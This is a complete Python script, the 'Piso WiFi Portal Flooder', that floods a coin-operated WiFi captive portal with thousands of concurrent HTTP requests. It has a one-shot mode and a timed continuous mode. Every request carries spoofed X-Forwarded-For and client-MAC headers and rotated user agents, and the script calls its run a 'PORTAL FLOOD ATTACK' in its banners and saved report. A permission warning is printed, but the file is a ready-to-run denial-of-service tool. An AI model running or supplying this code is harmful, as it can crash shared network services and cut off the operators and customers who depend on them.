#!/usr/bin/env python3
"""
Piso WiFi Portal Flooder
Simply opens the portal URL from thousands of concurrent users simultaneously
"""

import requests
import threading
import time
import random
from datetime import datetime
import argparse
from queue import Queue
import sys

class PortalFlooder:
    def __init__(self, portal_url: str, num_users: int = 1000):
        """
        Initialize portal flooder
        
        Args:
            portal_url: Full portal URL (e.g., http://10.0.0.1/client?page=dashboard)
            num_users: Number of concurrent users to simulate
        """
        self.portal_url = portal_url
        self.num_users = num_users
        
        # Statistics
        self.success_count = 0
        self.failed_count = 0
        self.total_requests = 0
        self.lock = threading.Lock()
        
        # Performance tracking
        self.start_time = None
        self.end_time = None
        
        # Results
        self.results = []
        
        print(f"Target Portal: {portal_url}")
        print(f"Number of Users: {num_users:,}")
    
    def generate_user_agent(self, user_id: int):
        """Generate random user agent"""
        user_agents = [
            # Windows
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36",
            
            # macOS
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
            
            # iOS
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
            
            # Android
            "Mozilla/5.0 (Linux; Android 14; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.210 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.210 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.210 Mobile Safari/537.36",
            
            # Linux
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
        ]
        return random.choice(user_agents)
    
    def generate_ip_address(self, user_id: int):
        """Generate random IP address"""
        return f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
    
    def generate_mac_address(self, user_id: int):
        """Generate random MAC address"""
        return f"02:{random.randint(0,255):02x}:{random.randint(0,255):02x}:" \
               f"{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}"
    
    def open_portal(self, user_id: int):
        """Open the portal URL once for a single user"""
        headers = {
            'User-Agent': self.generate_user_agent(user_id),
            'X-Forwarded-For': self.generate_ip_address(user_id),
            'X-Client-MAC': self.generate_mac_address(user_id),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        }
        
        try:
            # Open the portal URL
            response = requests.get(
                self.portal_url,
                headers=headers,
                timeout=3,  # Short timeout for faster failures
                verify=False,
                allow_redirects=True
            )
            
            # Update statistics
            with self.lock:
                self.total_requests += 1
                
                if 200 <= response.status_code < 400:
                    self.success_count += 1
                    status = "SUCCESS"
                else:
                    self.failed_count += 1
                    status = f"FAILED ({response.status_code})"
                
                # Print progress every 100 requests
                if self.total_requests % 100 == 0:
                    elapsed = time.time() - self.start_time
                    req_per_sec = self.total_requests / elapsed if elapsed > 0 else 0
                    print(f"Progress: {self.total_requests:,}/{self.num_users:,} | "
                          f"Success: {self.success_count:,} | Failed: {self.failed_count:,} | "
                          f"Rate: {req_per_sec:.1f} req/sec")
                
                self.results.append({
                    'user_id': user_id,
                    'status': status,
                    'status_code': response.status_code,
                    'response_time': response.elapsed.total_seconds() * 1000  # ms
                })
            
            return True
            
        except requests.exceptions.Timeout:
            with self.lock:
                self.total_requests += 1
                self.failed_count += 1
                self.results.append({
                    'user_id': user_id,
                    'status': 'TIMEOUT',
                    'status_code': 0,
                    'response_time': 0
                })
            return False
            
        except requests.exceptions.ConnectionError:
            with self.lock:
                self.total_requests += 1
                self.failed_count += 1
                self.results.append({
                    'user_id': user_id,
                    'status': 'CONNECTION_ERROR',
                    'status_code': 0,
                    'response_time': 0
                })
            return False
            
        except Exception as e:
            with self.lock:
                self.total_requests += 1
                self.failed_count += 1
                self.results.append({
                    'user_id': user_id,
                    'status': f'ERROR: {str(e)[:50]}',
                    'status_code': 0,
                    'response_time': 0
                })
            return False
    
    def flood_portal(self, concurrent_threads: int = 100):
        """
        Flood the portal with simultaneous requests
        
        Args:
            concurrent_threads: Number of concurrent threads to use
        """
        print("\n" + "="*80)
        print("                    PORTAL FLOOD ATTACK")
        print("="*80)
        print(f"Target: {self.portal_url}")
        print(f"Total Users: {self.num_users:,}")
        print(f"Concurrent Threads: {concurrent_threads}")
        print(f"Start Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("-"*80)
        
        self.start_time = time.time()
        
        # Create work queue
        work_queue = Queue()
        for user_id in range(self.num_users):
            work_queue.put(user_id)
        
        # Worker function
        def worker(worker_id: int):
            while not work_queue.empty():
                try:
                    user_id = work_queue.get_nowait()
                    self.open_portal(user_id)
                    work_queue.task_done()
                except:
                    break
        
        # Create and start worker threads
        threads = []
        print(f"\nStarting {concurrent_threads} concurrent threads...")
        
        for i in range(concurrent_threads):
            thread = threading.Thread(target=worker, args=(i,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
            
            # Stagger thread creation slightly
            if i % 20 == 0:
                time.sleep(0.01)
        
        print(f"\n[STATUS] Flooding portal with {self.num_users:,} requests...")
        
        # Wait for all work to complete
        work_queue.join()
        
        # Wait for threads to finish
        for thread in threads:
            thread.join(timeout=2)
        
        self.end_time = time.time()
        
        # Print final report
        self.print_report()
    
    def continuous_flood(self, concurrent_threads: int = 100, duration: int = 60):
        """
        Continuous flood for specified duration
        
        Args:
            concurrent_threads: Number of concurrent threads
            duration: Duration in seconds to run the flood
        """
        print("\n" + "="*80)
        print("               CONTINUOUS PORTAL FLOOD")
        print("="*80)
        print(f"Target: {self.portal_url}")
        print(f"Concurrent Threads: {concurrent_threads}")
        print(f"Duration: {duration} seconds")
        print(f"Start Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("-"*80)
        
        self.start_time = time.time()
        end_time = self.start_time + duration
        
        # Worker function for continuous flood
        def continuous_worker(worker_id: int):
            request_count = 0
            while time.time() < end_time:
                user_id = random.randint(0, 1000000)  # Random user ID
                self.open_portal(user_id)
                request_count += 1
                
                # Small random delay between requests
                time.sleep(random.uniform(0.001, 0.01))
        
        # Create and start worker threads
        threads = []
        print(f"\nStarting {concurrent_threads} concurrent threads for {duration} seconds...")
        
        for i in range(concurrent_threads):
            thread = threading.Thread(target=continuous_worker, args=(i,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
            time.sleep(0.01)
        
        # Monitor progress
        print("\n[STATUS] Continuous flood in progress...")
        while time.time() < end_time:
            elapsed = time.time() - self.start_time
            remaining = end_time - time.time()
            
            with self.lock:
                req_per_sec = self.total_requests / elapsed if elapsed > 0 else 0
                
                print(f"\rTime: {elapsed:.1f}s / {duration}s | "
                      f"Requests: {self.total_requests:,} | "
                      f"Success: {self.success_count:,} | "
                      f"Rate: {req_per_sec:.1f} req/sec | "
                      f"Remaining: {remaining:.1f}s", end="", flush=True)
            
            time.sleep(1)
        
        print()  # New line after progress
        self.end_time = time.time()
        
        # Wait for threads
        for thread in threads:
            thread.join(timeout=2)
        
        # Print final report
        self.print_report()
    
    def print_report(self):
        """Print detailed report"""
        print("\n" + "="*80)
        print("                      FLOOD ATTACK REPORT")
        print("="*80)
        
        duration = self.end_time - self.start_time
        
        print(f"\n📊 REQUEST STATISTICS:")
        print(f"   Total Requests: {self.total_requests:,}")
        print(f"   Successful: {self.success_count:,}")
        print(f"   Failed: {self.failed_count:,}")
        
        if self.total_requests > 0:
            success_rate = (self.success_count / self.total_requests) * 100
            print(f"   Success Rate: {success_rate:.2f}%")
        
        print(f"\n⏱️  PERFORMANCE METRICS:")
        print(f"   Total Duration: {duration:.2f} seconds")
        if duration > 0:
            print(f"   Requests per Second: {self.total_requests / duration:.2f}")
            print(f"   Average Response Time: {self.calculate_avg_response_time():.2f} ms")
        
        print(f"\n📈 LOAD CHARACTERISTICS:")
        print(f"   Target URL: {self.portal_url}")
        print(f"   Concurrent Users: ~{self.total_requests / duration if duration > 0 else 0:.0f} per second")
        
        # Response code breakdown
        print(f"\n🔢 RESPONSE CODE BREAKDOWN:")
        status_counts = {}
        for result in self.results:
            status = result['status']
            status_counts[status] = status_counts.get(status, 0) + 1
        
        for status, count in sorted(status_counts.items()):
            percentage = (count / self.total_requests) * 100 if self.total_requests > 0 else 0
            print(f"   {status}: {count:,} ({percentage:.1f}%)")
        
        # Save results to file
        self.save_results(duration)
        
        print("\n" + "="*80)
    
    def calculate_avg_response_time(self):
        """Calculate average response time"""
        total_time = 0
        count = 0
        for result in self.results:
            if result['response_time'] > 0:
                total_time += result['response_time']
                count += 1
        return total_time / count if count > 0 else 0
    
    def save_results(self, duration: float):
        """Save results to file"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"portal_flood_{timestamp}.txt"
        
        with open(filename, 'w') as f:
            f.write("="*80 + "\n")
            f.write("PORTAL FLOOD ATTACK REPORT\n")
            f.write("="*80 + "\n\n")
            
            f.write(f"Target URL: {self.portal_url}\n")
            f.write(f"Test Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Duration: {duration:.2f} seconds\n\n")
            
            f.write("📊 STATISTICS:\n")
            f.write("-"*40 + "\n")
            f.write(f"Total Requests: {self.total_requests}\n")
            f.write(f"Successful: {self.success_count}\n")
            f.write(f"Failed: {self.failed_count}\n")
            
            if self.total_requests > 0:
                success_rate = (self.success_count / self.total_requests) * 100
                f.write(f"Success Rate: {success_rate:.2f}%\n")
            
            f.write(f"\nRequests per Second: {self.total_requests / duration:.2f}\n")
            f.write(f"Average Response Time: {self.calculate_avg_response_time():.2f} ms\n\n")
            
            f.write("📝 SAMPLE REQUESTS (First 50):\n")
            f.write("-"*40 + "\n")
            for result in self.results[:50]:
                f.write(f"User {result['user_id']:08d}: {result['status']} ({result['response_time']:.1f} ms)\n")
        
        print(f"\n✓ Results saved to: {filename}")


def main():
    """Main function"""
    parser = argparse.ArgumentParser(
        description="Piso WiFi Portal Flooder - Simulate thousands of users opening portal simultaneously",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Flood with 1000 users, 100 concurrent threads
  python3 portal_flood.py --url "http://10.0.0.1/client?page=dashboard" --users 1000
  
  # Continuous flood for 2 minutes
  python3 portal_flood.py --url "http://10.0.0.1/client?page=dashboard" --continuous --duration 120
  
  # High-intensity flood with 500 concurrent threads
  python3 portal_flood.py --url "http://10.0.0.1/client?page=dashboard" --users 5000 --threads 500
  
  # Quick test
  python3 portal_flood.py --url "http://192.168.1.1" --users 100
        """
    )
    
    parser.add_argument("--url", "-u", required=True, help="Portal URL (e.g., http://10.0.0.1/client?page=dashboard)")
    parser.add_argument("--users", "-n", type=int, default=1000, help="Number of users/requests")
    parser.add_argument("--threads", "-t", type=int, default=100, help="Concurrent threads")
    
    # Continuous mode
    parser.add_argument("--continuous", "-c", action="store_true", help="Continuous flood mode")
    parser.add_argument("--duration", "-d", type=int, default=60, help="Duration in seconds (continuous mode only)")
    
    args = parser.parse_args()
    
    print("="*80)
    print("             PISO WIFI PORTAL FLOODER")
    print("             Thousands of Simultaneous Users")
    print("="*80)
    
    print(f"\n⚠️  ⚠️  ⚠️  EXTREME WARNING ⚠️  ⚠️  ⚠️")
    print("This tool will generate massive amounts of traffic!")
    print("It can overload and potentially crash the target server.")
    print("Only use on networks you own or have permission to test.")
    print("You are responsible for any damage caused.\n")
    
    print(f"Target URL: {args.url}")
    
    if args.continuous:
        print(f"Mode: Continuous flood for {args.duration} seconds")
        print(f"Concurrent Threads: {args.threads}")
    else:
        print(f"Total Users: {args.users:,}")
        print(f"Concurrent Threads: {args.threads}")
    
    # Final confirmation
    confirm = input("\nAre you absolutely sure you want to proceed? (yes/no): ").lower()
    if confirm != 'yes':
        print("\n❌ Operation cancelled")
        return
    
    # Create flooder
    flooder = PortalFlooder(args.url, args.users if not args.continuous else 0)
    
    try:
        if args.continuous:
            flooder.continuous_flood(args.threads, args.duration)
        else:
            flooder.flood_portal(args.threads)
            
    except KeyboardInterrupt:
        print("\n\n⚠️  Flood interrupted by user")
        if flooder.start_time:
            flooder.end_time = time.time()
            flooder.print_report()
            
    except Exception as e:
        print(f"\n❌ Error: {e}")
        import traceback
        traceback.print_exc()


if __name__ == "__main__":
    # Disable SSL warnings for cleaner output
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    main()